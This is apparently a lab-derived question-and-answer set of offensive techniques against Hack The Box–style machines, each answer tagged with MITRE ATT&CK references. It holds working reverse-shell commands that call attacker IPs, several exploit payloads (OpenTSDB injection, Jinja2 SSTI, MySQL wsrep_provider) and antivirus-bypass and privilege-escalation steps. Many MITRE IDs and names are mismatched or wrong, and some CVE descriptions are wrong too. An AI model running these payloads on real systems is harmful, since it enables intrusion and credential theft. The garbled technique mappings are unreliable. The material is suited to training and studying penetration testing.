A: If a SUID binary is configured to generate core dumps, an attacker can intentionally cause the binary to crash while it is reading a sensitive file, such as an SSH private key. The contents of the sensitive file will be included in the core dump, which can then be analyzed to extract the data. Tools like apport-unpack can be used to inspect the contents of the core dump file. MITRE References: MITRE ID is T1140, MITRE Name is: Deobfuscate/Decode Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can you use a backdoor in a WordPress blog to get a reverse shell?
A: The WordPress blog had a backdoor in the 'wp-includes/comment.php' file that allowed us to activate it by making a comment with a specific email, website, and comment body. This would cause the server to connect back to our machine, and we could then send encoded commands to the backdoor to execute code and get a reverse shell as the 'www-data' user. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Persistence, Execution.

## Q: How can you extract password hashes from a MySQL database and crack them offline?
A: We can use the MySQL credentials retrieved from the WordPress configuration to access the internal MySQL server running on 172.69.0.104. We can then extract the password hashes for all the users using SQL queries, and crack them offline using a tool like Hashcat and a password dictionary like rockyou.txt. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Credential Access.

## Q: How can you exploit a misconfigured Flask application to read its source code?
A: The Flask application had a misconfiguration where the 'static_folder' was set to an empty string, allowing us to access the application's source code by requesting '/static/app.py'. We can then examine the source code to find that the application allows connecting to a remote MySQL server by passing a specific parameter, which we can leverage to further our attack. MITRE References: MITRE ID is T1551, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Defense Evasion.

## Q: How can you capture a MySQL network authentication hash and crack it to retrieve the password?
A: We can exploit the Flask application's ability to connect to a remote MySQL server to make it connect back to our own rogue MySQL server. This allows us to capture the network authentication hash, which we can then crack using tools like John the Ripper. The format of the hash is '$mysqlna$[8 char salt in hex][12 char salt in hex]*[password hash]'. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you exploit a custom PAM module to perform a time-based brute force attack and extract a hardcoded password?
A: The custom PAM module 'mypam.so' had a vulnerability where it would compare the first 10 characters of the password character-by-character, introducing a significant delay when a correct character was found. We can exploit this to perform a time-based brute force attack and extract the hardcoded password character-by-character. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation.

## Q: What are some techniques to enumerate IPMI services and retrieve password hashes?
A: To enumerate IPMI services and retrieve password hashes, you can use the Metasploit module auxiliary/scanner/ipmi/ipmi_dumphashes. This module uses the IPMI protocol to attempt to dump the password hashes for users on the target system. To use this module, set the RHOSTS option to the target IP address and run the module. The hashes can then be saved to a file and cracked using a tool like Hashcat (version 6.2.6). MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you abuse the Zabbix agent to execute remote commands on a target system?
A: To abuse the Zabbix agent to execute remote commands, you can leverage the 'system.run' item. Navigate to the target host's configuration in Zabbix, create a new item, and enter a command in the 'Key' field that will execute your desired payload. For example, 'system.run[curl 10.10.14.13|bash,nowait]' will execute a reverse shell payload on the target system. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you exploit a vulnerable MySQL service to gain a root shell on a target system?
A: To exploit a vulnerable MySQL service, you can leverage the CVE-2021-27928 vulnerability, which allows for OS command execution. First, generate a reverse shell payload using msfvenom (version 6.2.0) and copy it to the target system. Then, connect to the MySQL service using the credentials found in the Zabbix configuration files, and issue the following command to trigger the exploit: 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, PrivilegeEscalation.

## Q: How can you bypass a Local File Inclusion (LFI) filter using Unicode characters?
A: To bypass a Local File Inclusion (LFI) filter using Unicode characters, you can leverage the fact that some web applications may convert Unicode characters back to ASCII before processing the input. First, identify the LFI endpoint and the filtering applied. Then, search for Unicode representations of characters like '../' that can bypass the filters. For example, the Unicode character 'â€¥' can be used to represent '../' and bypass the LFI filter. You can then use this technique to access sensitive files on the server, such as /etc/passwd or configuration files. For example: http://hackmedia.htb/display/?page=â€¥/â€¥/â€¥/â€¥/â€¥/â€¥/â€¥/etc/passwd MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can a screen session be used for privilege escalation on a Linux system?
A: Screen is a terminal multiplexer that allows you to create, detach, and reattach terminal sessions. If a screen session is running as the root user, an attacker can attach to that session and gain root privileges. This can be done by enumerating the /var/run/screen/S-root directory, which contains the root screen session, and then using the screen -x root/root command to attach to the session and gain a root shell. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What is the SQL injection technique used to bypass the filtering on the password reset page?
A: The password reset page has a filter in place that checks for case-sensitive SQL syntax. To bypass this, the UNION statement can be written as 'uniOn' instead of 'UNION'. Additionally, the results must be returned with a trailing '@example.com' format, which can be achieved using the CONCAT function or a similar method. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, Initial Access.

## Q: How can you use the Axel download utility to escalate privileges on a Linux system?
A: Axel is a command-line download accelerator that can be used to download files from the internet. It can be misconfigured to download files to specific locations on the filesystem, including sensitive directories like the root user's .ssh directory. This can be exploited to add SSH keys to the root user's authorized_keys file, allowing for privilege escalation. 

To exploit this, you can create an .axelrc configuration file in the target user's home directory that sets the default_filename parameter to point to the root user's .ssh/authorized_keys file. Then, when the Axel utility is run, it will download a file to that location, effectively adding your SSH key and allowing you to login as root. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004.

## Q: How can you obtain a foothold on a target system by leveraging exposed credentials in a web page?
A: To obtain a foothold by leveraging exposed credentials in a web page, you can try the following steps:1. Carefully inspect the web page for any credentials or password hints that may be visible in the HTML, images, or other content. 2. Use tools like Gobuster or Dirbuster to enumerate additional web directories that may contain more information.3. If you find valid credentials, try using them to authenticate to other services like LDAP or SMB.4. Perform a Kerberoast attack to obtain a crackable service account hash, then spray the hash against a subset of discovered user accounts to find matching credentials.5. With the obtained credentials, access SMB shares and look for interesting files or documents that may contain additional credentials or sensitive information. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What is Path Variable Hijacking and how can it be used for privilege escalation?
A: Path Variable Hijacking is a technique where an attacker can create a malicious file with the same name as a legitimate binary, and then prepend the directory containing the malicious file to the PATH variable. This causes the malicious file to be executed instead of the intended binary, potentially leading to privilege escalation. For example, the commands `echo "/bin/bash -i >& /dev/tcp/10.10.14.6/4444 0>&1" > /tmp/tar && chmod +x /tmp/tar && export PATH=/tmp:$PATH && /usr/bin/pandora_backup` can be used to create a malicious `tar` file, modify the PATH variable, and then execute the `pandora_backup` binary to gain a root shell. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: Privilege Escalation.

## Q: How can you exploit an SSRF vulnerability in Adminer 4.7.8?
A: To exploit the SSRF vulnerability in Adminer 4.7.8 (CVE-2021-21311), we can use a Python script to set up a redirect server and then craft a malicious login request to Adminer that redirects to an internal port on the target system. For example, we can run the command: python2 redirect.py -p 80 "http://127.0.0.1:4242/" to set up a redirect server, and then send a login request from Adminer with the parameters auth[driver]=elastic&auth[server]=10.10.14.6 to trigger the SSRF and access the internal port 4242. MITRE References: MITRE ID is T1570, MITRE Name is: Lateral Tool Transfer, and MITRE Tactics are: Lateral Movement.

## Q: How can you exploit a command injection vulnerability in OpenTSDB 2.4.0?
A: To exploit the command injection vulnerability in OpenTSDB 2.4.0 (CVE-2020-35476), we can craft a malicious request to the /q endpoint with a payload in the yrange parameter. For example, we can run the command: python2 redirect.py -p 80 "http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('nc%2010.10.14.6%207777%20-e%20/bin/bash')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json" to get a reverse shell as the opentsdb user. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you leverage a Fail2Ban vulnerability to escalate privileges to root on the target system?
A: To exploit the Fail2Ban vulnerability, we can chain it with the PHP Object Injection vulnerability in OpenCATS to override the /usr/local/etc/whois.conf file and execute a malicious payload. First, we can use phpggc to generate a payload that writes a malicious whois.conf file. Then, we can trigger the OpenCATS vulnerability to write the file, and finally, we can trigger the Fail2Ban vulnerability by making a series of failed SSH attempts, causing Fail2Ban to execute the malicious whois.conf file and give us a root shell. For example, we can run the command: printf "pwned\n~! bash -c 'bash -i &>/tcp/10.10.14.6/7777 0>&1'\n" | sudo ncat -lnvp 43 to set up a listener on port 43 and then trigger the Fail2Ban vulnerability to execute the payload and get a root shell. MITRE References: MITRE ID is T1068, MITRE Name is: Elevation of Privilege, and MITRE Tactics are: Privilege Escalation.

## Q: How can you exploit a vulnerability like CVE-2021-22204 in ExifTool to gain a remote shell?
A: For CVE-2021-22204 in ExifTool, you can use a public exploit like the one at https://github.com/convisolabs/CVE-2021-22204-exiftool. This exploit generates a malicious JPEG file that, when uploaded to a vulnerable application, will trigger remote command execution and give you a reverse shell. You would need to update the script with your attacking machine's IP address before running it to generate the malicious file. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Execution, Lateral Movement.

## Q: How can you leverage a command injection vulnerability in ImageMagick to move laterally on a target system?
A: To exploit a command injection vulnerability in ImageMagick, you can create a malicious SVG file that injects a reverse shell payload. For example, you could create a file named rce.svg containing a base64-encoded reverse shell command, and then wait for the periodic image conversion script to execute your payload and give you a shell as the target user. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Execution, Lateral Movement.

## Q: How can you escalate privileges on a system by abusing the XDG_CONFIG_HOME environment variable with the Neofetch tool?
A: You can escalate privileges on a system by abusing the XDG_CONFIG_HOME environment variable with Neofetch. If Neofetch is configured to run as root without a password, and the XDG_CONFIG_HOME variable is preserved, you can create a custom Neofetch configuration file in a directory under your control that includes a reverse shell payload. When Neofetch is run with sudo, it will retrieve the configuration from your directory and execute the payload, giving you a root shell. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can the CVE-2019-17671 vulnerability in WordPress 5.2.3 be exploited to view confidential draft posts?
A: CVE-2019-17671 is a vulnerability in WordPress versions prior to 5.2.4 that allows unauthenticated users to view private and draft posts. By appending "?static=1" to the WordPress URL, we can exploit this vulnerability and view the confidential draft posts on the website. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can the Rocketchat bot's functionality be used to obtain the password of a user on the system?
A: The Rocketchat bot, named "recyclops", has limited functionality that allows users to list and read files from the "Sales" directory. By using the "list .." and "file ../hubot/.env" commands, we can navigate to the Rocketchat bot's configuration directory and read the "PASSWORD" environment variable, which contains the password for the "dwight" user. MITRE References: MITRE ID is T1003, MITRE Name is: Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can the CVE-2021-3560 vulnerability in the Sudo version be exploited to escalate privileges to root?
A: CVE-2021-3560 is a vulnerability in the Sudo version 1.8.29 that allows a regular user to bypass authentication and escalate their privileges to root. By downloading and running the proof-of-concept exploit script, a new user with sudo privileges is created, allowing us to switch to that user and access the root flag. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you perform a Remote Connection exploit using the Erlang Cookie?
A: If you can leak the Authentication cookie, usually located in `~/.erlang.cookie`, you can execute code on the host using the following commands:

`erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn`
From the remote shell, you can run commands like `os:cmd("id").` to escalate privileges. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can you perform a Local Connection exploit using the Erlang Cookie?
A: You can abuse CouchDB to escalate privileges locally using the following commands:

`HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE`
`(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).`
`(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"]). MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can you use Metasploit to exploit the Erlang Cookie vulnerability?
A: Metasploit can also exploit the Erlang Cookie vulnerability if you know the cookie. You can use the `use exploit/multi/misc/erlang_cookie_rce` module. MITRE References: MITRE ID is T1203, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: How can you leverage a Server-Side Template Injection (SSTI) vulnerability to gain remote code execution on a web application?
A: To leverage a Server-Side Template Injection (SSTI) vulnerability to gain remote code execution on a web application, you can follow these steps:1. Identify the SSTI vulnerability by sending a payload like '{{7*7}}' and verifying that the result is returned.2. Craft a reverse shell payload, for example, by base64-encoding a Bash reverse shell command.3. Inject the reverse shell payload into the SSTI-vulnerable parameter, using a Jinja2 RCE payload like '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %} {{x()._module.__builtins__["__import__"]("os").system("base64-decoded-payload")}}{%endif%}{% endfor %}'.4. Open a listener on your attacking machine and wait for the reverse shell to connect. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: TA0004.

## Q: How can you leverage world-readable SSL certificates to mount a GlusterFS volume and gain access to a user's home directory?
A: To leverage world-readable SSL certificates to mount a GlusterFS volume and gain access to a user's home directory, you can follow these steps:1. Identify that the GlusterFS volume '/vol1' is mounted locally to the '/home/jennifer' directory, but you were unable to mount it remotely due to SSL certificate issues.2. Locate the SSL key and certificates in the '/etc/ssl' directory, which are world-readable (including the 'glusterfs.key' file, which is not typically world-readable by default).3. Copy the SSL key and certificates to your local '/etc/ssl' directory.4. Use the copied SSL key and certificates to mount the '/vol1' GlusterFS volume from your attacking machine with the 'mount -t glusterfs flustered:/vol1 /mnt/jennifer' command.5. Once the volume is mounted, you can read the user flag in '/mnt/jennifer/user.txt' and add your public SSH key to the '.ssh/authorized_keys' file to gain a shell as the 'jennifer' user. MITRE References: MITRE ID is T1552.004, MITRE Name is: Steal or Forge Credentials: SSL/TLS Certificates, and MITRE Tactics are: TA0006.

## Q: How can you leverage an Azure Storage emulator (Azurite) to gain root access on a system?
A: To leverage an Azure Storage emulator (Azurite) to gain root access on a system, you can follow these steps:1. Identify that the system has an open port 10000, which is the default port for the Azurite Azure Storage emulator.2. Use SSH dynamic port forwarding to access the Azurite service on the remote system through your local machine: 'ssh -N -D 1080 jennifer@flustered'.3. Install the Azure Storage Explorer application and configure a new connection to the local storage emulator, using the 'jennifer' account name and the base64-encoded 'key' data found in the '/var/backups/key' file.4. Explore the available blob containers, one of which ('ssh-keys') contains a 'root.key' file that can be used to SSH to the system as the root user. MITRE References: MITRE ID is T1021.001, MITRE Name is: Remote Services: SSH, and MITRE Tactics are: TA0008.

## Q: How can you bypass Windows Defender to execute a malicious payload?
A: To bypass Windows Defender and execute a malicious payload, you can try uploading the payload to a directory that is excluded from Windows Defender scans. For example, on the Acute machine, the C:\utils directory was excluded from Windows Defender, so uploading the malicious executable there allowed it to execute without being blocked. MITRE References: MITRE ID is T1222, MITRE Name is: Impair Defenses, and MITRE Tactics are: TA0005.

## Q: How can you modify a PowerShell script on a remote machine to escalate privileges?
A: To modify a PowerShell script on a remote machine to escalate privileges, you can use the Invoke-Command cmdlet and string replacement to modify the script. For example, on the Acute machine, the wm.ps1 script was modified to replace the `Get-Volume` command with `net localgroup administrators edavies /add` to add the `edavies` user to the local Administrators group. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: TA0004.

## Q: How can you use password reuse to pivot to another system?
A: If you discover that a user's password is reused across multiple systems, you can use that information to pivot to other systems. For example, on the Acute machine, the Administrator's password was cracked and then successfully used to log in to the ATSSERVER system as the user AWallace. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: TA0006.

## Q: How can you use a scheduled task to escalate privileges in a Windows environment?
A: By modifying a scheduled task or script that is executed by a privileged user, you can escalate your privileges. On the Acute machine, the `keepmeon.bat` script was modified to add the `imonks` user to the `site_admin` group, which had access to the `Domain Admins` group, allowing `imonks` to become a domain administrator. MITRE References: MITRE ID is T1053, MITRE Name is: Scheduled Task/Job, and MITRE Tactics are: TA0004.

## Q: How can you escalate privileges by abusing the Tiller service?
A: If the Tiller service is installed in the kube-system namespace with high privileges, you can escalate privileges by installing a package like the one found at https://github.com/Ruil1n/helm-tiller-pwn. This package will give the default service token access to everything in the whole cluster.

To use this, run the following commands:

```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
``` MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you abuse a tar symlink in a cronjob to escalate privileges on a Linux system?
A: If a cronjob is running a tar command with the 'h' flag, which follows symlinks, you can create a symlink to a sensitive file (such as the root user's SSH key) within the 5-second window before the tar command runs. This will cause the tar command to archive the sensitive file, which you can then retrieve and use to gain root access to the system. MITRE References: MITRE ID is T1166, MITRE Name is: Rundll32, and MITRE Tactics are: TA0004.

## Q: How can we escalate our privileges within the Kubernetes cluster after gaining code execution in a pod?
A: After gaining code execution within a pod, we can try to extract the service account token and certificate from the pod. These can be found at the paths '/var/run/secrets/kubernetes.io/serviceaccount/token' and '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt' respectively. We can then use these credentials with kubectl to list the permissions of the default service account, which may allow us to create our own malicious pod and gain further access to the cluster. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you perform SQL injection to bypass authentication in a web application?
A: To perform a SQL injection attack to bypass authentication, you can try injecting a payload like 'admin' OR '1'='1' into the login form. This will cause the SQL query to evaluate to true, allowing you to authenticate as an admin user without valid credentials. You can use tools like sqlmap to automate the SQL injection process and extract sensitive data from the database. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001, TA0002.

## Q: How can you use hash cracking to obtain plaintext passwords from a compromised database?
A: If a web application stores user passwords using a weak hashing algorithm, it may be possible to crack the hashes and obtain the plaintext passwords. You can use tools like John the Ripper or Hashcat to try different cracking techniques like rainbow tables or brute force attacks to crack the hashes. It's important to use strong hashing algorithms like bcrypt or Argon2 to prevent this type of attack. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you leverage the GenericWrite permission on a user account to gain a shell on a Windows system?
A: To leverage the GenericWrite permission on a user account to gain a shell on a Windows system:1. Identify a user account with the GenericWrite permission on another user account.2. Use PowerShell to set the logon script for the target user account to a script that downloads and executes a reverse shell payload, such as Powercat.3. Wait for the target user to log in, which will execute the logon script and provide you with a shell.This technique allows you to execute arbitrary code on the system by abusing the GenericWrite permission to modify the target user's logon script. MITRE References: MITRE ID is T1547.001, MITRE Name is: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you leverage the WriteOwner permission on the Domain Admins group to gain a SYSTEM shell on a Windows domain controller?
A: To leverage the WriteOwner permission on the Domain Admins group to gain a SYSTEM shell on a Windows domain controller:1. Identify a user account, such as 'maria', that has the WriteOwner permission on the Domain Admins group.2. Use PowerShell to set the owner of the Domain Admins group to the 'maria' user account.3. Add the 'maria' user account to the Domain Admins group, effectively granting it full control over the group.4. Log in to the system using the 'maria' account, which now has Domain Admin privileges, to gain a SYSTEM shell.This technique allows you to escalate your privileges to the highest level on the domain by abusing the WriteOwner permission on a critical group. MITRE References: MITRE ID is T1136.002, MITRE Name is: Create Account: Domain Account, and MITRE Tactics are: Privilege Escalation, Persistence.

## Q: How can you bypass two-factor authentication (2FA) on a WordPress site by extracting the secret key from the database?
A: To bypass the two-factor authentication (2FA) on the WordPress site, you can follow these steps:1. Use SQLmap to extract the encrypted 2FA secret key from the wp_usermeta table in the WordPress database:sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --keep-alive --dbms=mysql --risk 3 --technique=TB --threads=5 --random-agent --level 3 -D wordpress -T wp_usermeta --sql-query="select meta_value from wp_usermeta where meta_key = 'mo2f_gauth_key'" --hex2. Examine the source code of the 2FA plugin to find the decryption function:grep -Ri 'mo2f_gauth_key' *The decryption function is located in the gaonprem.php file and uses AES encryption with a key stored in the 'mo2f_get_auth_rnd_string' meta key.3. Write a PHP script to decrypt the 2FA secret key:<?phpinclude 'encryption.php';$key = 'kHHxxX3f';$secret = 'qGEPwI6RQBxF4aXM6PVuriofiwCH4mjc4ZjO3jWN5gDDX5MzLHTfDk3tRGK7vwkkTbAjoxNf qFeMjJZoSI5yPF25Hd5b8lSaF/Dpc6WMBTA=';$dec = mo2f_GAuth_AESEncryption::decrypt_data($secret, $key);echo $dec;?>4. Use the decrypted secret key in an authentication app like the Firefox Authenticator to generate a valid one-time password and bypass the 2FA. MITRE References: MITRE ID is T1112, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: TA0006.

## Q: What are some techniques to enumerate NFS shares on a target system?
A: To enumerate NFS shares on a target system, you can use the following techniques:1. Use the 'nmap' tool with the '--script nfs-ls' option to list the contents of the NFS shares. For example: 'nmap -sV --script=nfs-ls 10.10.10.34'2. Use the 'showmount' command to list the NFS shares exported by the target. For example: 'showmount -e 10.10.10.34'3. Mount the NFS share locally using the 'mount' command to interact with the contents. For example: 'mount -t nfs 10.10.10.34:/var/nfsshare /mnt' MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you escape a SELinux sandbox environment to escalate privileges on a target system?
A: To escape a SELinux sandbox environment and escalate privileges, you can use the following technique:1. Utilize the 'NFSShell' tool to connect to the NFS share and upload your exploit binary.2. Modify the exploit to copy an SSH key from the NFS share to the target's authorized_keys file.3. Execute the exploit binary on the target using the pwntools session.4. SSH into the target system using the generated private key to gain access as the privileged user.The key steps are to leverage the NFS share to upload and execute your exploit, as well as place an SSH key to directly access the system after escaping the sandbox. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you crack an encrypted RAR archive using a custom wordlist?
A: To crack an encrypted RAR archive using a custom wordlist, you can follow these steps:1. Generate a wordlist based on the provided hints using a tool like 'wordlistgen_jail.py'.2. Use the 'rar2john' tool to convert the encrypted RAR file into a format that 'john the ripper' can use. For example: 'rar2john keys.rar > keys.hash'3. Run 'john' with the generated wordlist to crack the RAR password. For example: 'john keys.hash --wordlist=wordlist.txt'This approach allows you to create a targeted wordlist based on the provided hints and use it with 'john the ripper' to crack the encrypted RAR archive. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you generate a private key from a weak public key using the RsaCtfTool?
A: To generate a private key from a weak public key using the RsaCtfTool, follow these steps:1. Obtain the public key file (e.g., 'rootauthorizedsshkey.pub') from the target system.2. Use the RsaCtfTool to generate the private key from the public key. For example:'RsaCtfTool.py --publickey ./rootauthorizedsshkey.pub --private'This will generate the private key file that can be used to authenticate as the root user on the target system.The RsaCtfTool is a useful tool for analyzing and exploiting weaknesses in RSA keys, including generating private keys from public keys in certain cases. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you leverage a web application's session management vulnerability to gain unauthorized access?
A: To leverage a web application's session management vulnerability to gain unauthorized access, you can follow these steps:1. Identify the vulnerable application and the specific session management vulnerability, such as weak session tokens or insecure session handling.2. Intercept the victim's session token using a tool like Burp Suite or OWASP ZAP.3. Analyze the session token to understand its structure and any patterns or weaknesses.4. Attempt to forge a valid session token by modifying the intercepted token or generating a new one based on the identified weaknesses.5. Use the forged session token to access the web application and gain unauthorized access, potentially with the privileges of the victim user.Tools like Burp Suite and OWASP ZAP can be used to intercept and analyze web traffic, while libraries like phpggc can be used to generate payloads for specific session management vulnerabilities. MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: Lateral Movement.

## Q: How can you perform a cross-site scripting (XSS) attack and steal user credentials?
A: To perform a cross-site scripting (XSS) attack and steal user credentials, you can follow these steps:1. Identify a web application that is vulnerable to XSS, where user input is not properly sanitized and can be used to inject malicious scripts.2. Craft a malicious payload that includes a script to steal the victim's session token or other sensitive information, such as login credentials.3. Embed the malicious payload in a URL or other user input field within the vulnerable application.4. Trick the victim into interacting with the malicious payload, such as by sending them a link or getting them to submit a form.5. When the victim interacts with the malicious payload, the script will execute in their browser and send the stolen information to a server you control.Tools like BeEF (Browser Exploitation Framework) can be used to generate and deploy XSS payloads, while Burp Suite and OWASP ZAP can be used to identify and test for XSS vulnerabilities. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you perform a server-side request forgery (SSRF) attack to gain unauthorized access to a web application?
A: To perform a server-side request forgery (SSRF) attack to gain unauthorized access to a web application, you can follow these steps:1. Identify a web application that is vulnerable to SSRF, where it allows the user to specify a URL that the server will fetch and process.2. Craft a malicious URL that points to an internal or private resource within the target network, such as an administrative panel or a database server.3. Embed the malicious URL in a request to the vulnerable application, causing the server to fetch the resource and potentially expose sensitive information or provide further access.4. Analyze the response from the server to determine if the SSRF was successful and if you can leverage the obtained information to gain unauthorized access.Tools like Burp Suite and OWASP ZAP can be used to identify and test for SSRF vulnerabilities, while custom scripts or tools like Postman can be used to craft and send the malicious requests. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use the LAPS feature in Active Directory to escalate privileges?
A: To escalate privileges using the LAPS (Local Administrator Password Solution) feature in Active Directory, you can first check if the current user is a member of the LAPS_Readers group, which has the ability to read the local administrator passwords of domain computers. You can use the 'net user svc_deploy' command to check the groups the 'svc_deploy' user is a member of. If the LAPS_Readers group is listed, you can use the 'get-admpwdpassword -computername dc01' PowerShell command to retrieve the local administrator password for the 'dc01' domain controller and then use that to authenticate as the administrator user. MITRE References: MITRE ID is T1078.002, MITRE Name is: Valid Accounts: Domain Accounts, and MITRE Tactics are: TA0006.

## Q: How can you leverage path traversal vulnerabilities in web applications to read sensitive files?
A: To leverage path traversal vulnerabilities, you can:1. Identify a web application that uses user-controlled input to read files without proper sanitization.2. Construct a payload that uses directory traversal sequences like '../' to access files outside the web root, such as /etc/passwd.3. Send the payload in the 'page' parameter of the web application to retrieve the contents of the sensitive file. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript, and MITRE Tactics are: Execution.

## Q: How can you leverage the binfmt_misc feature in Linux to escalate privileges?
A: To escalate privileges using binfmt_misc:1. Identify a setuid root binary on the system that can be registered with a custom interpreter.2. Create a program that sets the effective UID and GID to 0 to spawn a root shell.3. Register the custom interpreter program with the 'C' flag, which will execute the interpreter with root privileges when the setuid binary is run.4. Create a symbolic link to the setuid binary with a custom file extension and execute the linked file to trigger the privilege escalation. MITRE References: MITRE ID is T1543.003, MITRE Name is: Create or Modify System Process: Windows Service, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can we perform command injection in the Jamovi web application to gain a foothold on the system?
A: We can perform command injection in the Jamovi web application by using the Rj Editor module, which allows us to run R programming language commands. We can inject a reverse shell payload in the Rj Editor to get a shell as the www-data user inside a Docker container. To do this, we start a netcat listener, craft a reverse shell payload, and execute it in the Rj Editor by pressing CTRL + SHIFT + ENTER. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can we leverage the Bolt CMS configuration to gain further access on the system?
A: We can leverage the Server Side Template Injection (SSTI) vulnerability in the Bolt CMS to execute arbitrary commands on the system. By modifying the Twig templates in the Bolt CMS admin panel and clearing the cache, we can inject a command execution payload in the URL parameter 'cmd' to get a reverse shell as the www-data user. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation.

## Q: How can we use port forwarding and MongoDB access to elevate our privileges to root on the system?
A: We can use port forwarding with the Chisel tool to access the MongoDB server running on a different Docker container. By modifying the user roles in the MongoDB database, we can gain admin access to the RocketChat application. We can then exploit the RocketChat webhook functionality to get a root shell in the RocketChat Docker container. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Lateral Movement.

## Q: How can we use the CAP_DAC_READ_SEARCH capability to further escalate our privileges to root on the system?
A: We can use the CAP_DAC_READ_SEARCH capability to run the Shocker exploit and read the root flag. First, we need to install the libcap2 and libcap2-bin packages to view the existing capabilities on the system. Once we confirm the CAP_DAC_READ_SEARCH capability, we can compile and run the Shocker exploit to read the /root/root.txt file and obtain the root flag. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation.

## Q: What is a common technique used to bypass AppLocker restrictions on Windows?
